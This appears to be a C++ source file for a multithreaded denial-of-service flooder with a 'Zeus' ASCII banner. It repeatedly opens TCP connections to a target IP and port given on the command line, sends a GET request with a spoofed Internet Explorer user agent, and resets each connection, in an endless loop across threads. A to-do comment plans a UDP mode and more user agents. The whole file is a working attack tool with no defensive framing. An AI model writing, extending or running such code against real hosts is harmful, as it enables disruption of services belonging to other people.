#include <iostream>
#include <cstring>
#include <thread>
#include <vector>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
using namespace std;

/* TO-DO:
	-[x] Make threading work
 	- Implement switch between TCP and UDP
 	- Add more user agents	
*/


// Variables
const char *banner =R""""(
$$$$$$$$\                              
\____$$  |                             
    $$  / $$$$$$\  $$\   $$\  $$$$$$$\ 
   $$  / $$  __$$\ $$ |  $$ |$$  _____|
  $$  /  $$$$$$$$ |$$ |  $$ |\$$$$$$\  
 $$  /   $$   ____|$$ |  $$ | \____$$\ 
$$$$$$$$\\$$$$$$$\ \$$$$$$  |$$$$$$$  |
\________|\_______| \______/ \_______/ 
)"""";
int socketIter = 700;
const char *getReq = "GET / HTTP 1.1 Mozzila/4.0(compatible; MSIE 6.0; window NT 5.1; SV1) \r\n";
int threadCount = 5;

// Socket
int socketOps(const char *target,int port){
	// Creation
	struct sockaddr_in host;
	int sock,conn;
	inet_pton(AF_INET,target,&host.sin_addr);
	host.sin_family = AF_INET;
	host.sin_port = htons(port);
	for(int i = 0; i < socketIter; i++){
		// Connection
		sock = socket(AF_INET, SOCK_STREAM, 0);
		if (sock < 0){
			cout << "Socket cannot be created\n";
			// Checking for errors that occured during testing
			switch(errno){
				case 12:
					cout << "ENOMEM - There is not enough storage. \n";
					sleep(1);
					continue;
				case 24:
					cout << "EMFILE - The socket descriptor table is full. \n";
					continue;
			};
			continue;
		};
		conn = (connect(sock,(struct sockaddr *)&host,sizeof(host)));
		if(conn < 0) {
			cout << "Connection failed\n";
			continue;		
		};
		// Sending data
		send(sock,getReq,strlen(getReq),0);
		time_t now = time(NULL);
		cout << "Sent request at - " << ctime(&now);
		// Closing the connection
		struct linger cls;
		cls.l_onoff = 1;
		cls.l_linger = 0;
		setsockopt(sock,SOL_SOCKET,SO_LINGER,&cls,sizeof(cls));
		close(sock);
		sock = -1;
	};
	return 0;
};

// MAIN
int main(int argc, char *argv[]){
	//Banner
	cout << banner;
	sleep(4);
	// Threading
	while (true){
		vector <thread> threads(threadCount);
		for(int i = 0; i < threadCount; i++){
			threads.push_back(thread(socketOps, argv[1], atoi(argv[2])));
		};
		for (auto &th : threads){
			if (th.joinable()){
				th.join();
			};
		};
	}
	return 0;
}
